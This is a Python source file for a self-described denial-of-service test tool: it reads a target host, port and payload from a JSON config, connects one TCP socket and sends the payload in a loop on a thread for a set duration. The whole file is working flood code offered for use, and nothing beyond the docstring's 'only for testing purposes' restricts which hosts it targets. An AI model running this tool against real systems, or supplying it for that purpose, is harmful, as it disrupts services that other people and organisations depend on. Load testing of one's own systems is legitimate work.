"""Deny Of Service Test Tool
This tool is only for testing purposes.

Usage:
    %s <config_file>
    %s -h | --help

Options:
    -h --help                   Show this screen.
"""

# ===== Imports ===== #
# Local imports
import os
import sys
import logging
from json import (load,
                  JSONDecodeError)
from typing import (Optional,
                    NoReturn)

# Third party imports
from socket import (socket,
                    AF_INET,
                    SOCK_STREAM,)
from threading import Thread

# Set the path to the root directory
os.chdir(os.path.dirname(os.path.abspath(__file__)))

# ===== Constants ===== #
ARGS: list[str] = sys.argv
LOGGING: dict[str, str] = {
    'level': 'DEBUG',
    'format': '[%(asctime)s] %(levelname)s [%(name)s.%(funcName)s:%(lineno)d] %(message)s',
    'datefmt': '%Y-%m-%d %H:%M:%S',
    'stream': sys.stdout
}

# ===== Logging ===== #
logging.basicConfig(level=LOGGING['level'],
                    format=LOGGING['format'],
                    datefmt=LOGGING['datefmt'],
                    stream=LOGGING['stream'])

# ===== Functions ===== #
def exit_error() -> NoReturn:
    """Exit the script with an error message.
    """
    logging.exception('Fatal error, exiting')
    os._exit(1)

def load_config(config_file: Optional[str] = 'config.json', *,
                encoding: Optional[str] = 'utf-8') -> dict:
    """Load the configuration file.

    Args:
        config_file (str, optional): The configuration file to use. Defaults to 'config.json'.
        encoding (str, optional): The encoding to use. Defaults to 'utf-8'.
    
    Raises:
        FileNotFoundError: If the configuration file does not exist.


    Returns:
        dict: The configuration file as a dictionary.
    """
    _return: dict[str, str | int] = {}

    if not os.path.exists(config_file):
        logging.error('Configuration file %s does not exist.', config_file)
        exit_error()

    with open(config_file, 'r', encoding=encoding) as file:
        try:
            _return = load(file)

        except JSONDecodeError as error:
            logging.error('Error loading configuration file: %s', error)

        finally:
            file.close()
    logging.info('Configuration file loaded successfully.')
    return _return

def check_config(config: dict) -> tuple[bool, list[str]]:
    """Check the configuration file.

    Args:
        config (dict): The configuration file to check.

    Returns:
        bool: True if the configuration file is valid, False otherwise.
    """
    _return: bool = True
    if not isinstance(config, dict):
        logging.error('Configuration file is not a dictionary.')
        return False

    if 'host' not in config:
        logging.error('Configuration file does not contain a host.')
        _return = False

    if 'port' not in config:
        logging.error('Configuration file does not contain a port.')
        _return = False

    if 'payload' not in config:
        logging.error('Configuration file does not contain a payload. (It can be empty)')
        _return = False

    return _return

def param_handler() -> str:
    """Handle the parameters passed to the script.
    """

    args: list[str] = ARGS[1:]
    logging.debug('Arguments: %s', args)

    if not args:
        logging.error('No arguments passed.')
        exit_error()

    if len(args) != 1:
        logging.error('Invalid number of arguments. Must be only one.'
                      'Either the configuration file or the help flag.')
        exit_error()

    if args[0] in ['-h', '--help']:
        print(__doc__ % (ARGS[0], ARGS[0]))
        sys.exit(0)

    return args[0]



# ===== Class ===== #
class DOS:
    """Main class for the DOS attack.
    """
    def __init__(self,*,
                 config: dict,
                 duration: Optional[int] = -1):
        """Initialize the DOS class.

        Args:
            config (dict): The configuration file.
            duration (int, optional): Time of the attack in seconds. Defaults to -1 (infinite).
        """
        self.__host: str = config['host']
        self.__port: int = config['port']
        self.__payload: str = config['payload']
        self.__duration: int = float(duration)
        self._is_attacking: bool = False
        self.__socket: socket

    def init_socket(self) -> None:
        """Initialize the socket for the DOS attack.
        """
        self.__socket = socket(AF_INET, SOCK_STREAM)
        self.__socket.settimeout(10)
        try:
            self.__socket.connect((self.__host, self.__port))
        except TimeoutError:
            logging.error('Connection timed out.')
            exit_error()
        except ConnectionRefusedError:
            logging.error('Connection refused.')
            exit_error()

        logging.info('Socket initialized successfully.')

    def attack(self) -> None:
        """Start the DOS attack.
        The attack will be run in a separate thread. 
        While the main thread will wait for the duration.
        """
        self._is_attacking = True
        self.init_socket()
        attack: Thread = Thread(target=self.__attack)
        attack.start()
        if self.__duration > 0:
            attack.join(self.__duration)
            self._is_attacking = False
            logging.info('Attack ended.')
        else:
            logging.info('Attack started.')

    def __attack(self) -> None:
        """The actual attack.
        """
        while self._is_attacking:
            try:
                self.__socket.sendall(self.__payload.encode())
            except TimeoutError:
                logging.error('Connection timed out.')
                exit_error()
            except ConnectionRefusedError:
                logging.error('Connection refused.')
                exit_error()

# ===== Main ===== #
def main():
    """Main function for the DOS attack tool.
    """
    config_file: str = param_handler()
    config = load_config(config_file)
    if not check_config(config):
        logging.error('Configuration file is not valid.')
        exit_error()
    dos = DOS(config=config, duration=10)
    dos.attack()

if __name__ == '__main__':
    main()
